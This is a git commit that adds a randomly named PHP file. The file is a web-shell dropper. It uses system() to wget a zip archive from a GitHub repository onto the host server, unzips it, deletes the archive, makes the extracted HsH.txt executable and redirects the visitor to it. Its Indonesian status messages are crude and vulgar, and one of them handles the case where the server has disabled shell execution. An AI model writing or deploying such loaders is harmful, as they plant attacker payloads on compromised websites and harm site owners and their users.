c53a5cc664234a28c8353cfa22b28ba24f79ca9e
antoniola <renata.cantiek@gmail.com>
2020-04-19 02:38:22 +0700

    Create 1ra894651235.php

---
+++ 1ra894651235.php
@@ -0,0 +1,10 @@
+<?php
+
+echo '<font color=lime>';
+if(system("wget -qO- -O tmp.zip https://github.com/antoniola/js/raw/master/pintu.zip && unzip tmp.zip && rm tmp.zip && chmod 0755 pintu/HsH.txt")) 
+echo '<br> <b><center>Selaman Anda Berhasil Ngocok</center></b><meta http-equiv="refresh" content="3;URL=./pintu/HsH.txt"/>';
+ else echo '<br><center><h1>Masih Di disabled Sama Server JON <br>Coba Lewat Sini</h1><a href=\'?jembut\'class=\'btn cta\'>Lewat Memek </a></center></b>';
+echo '</font>';
+
+
+?>
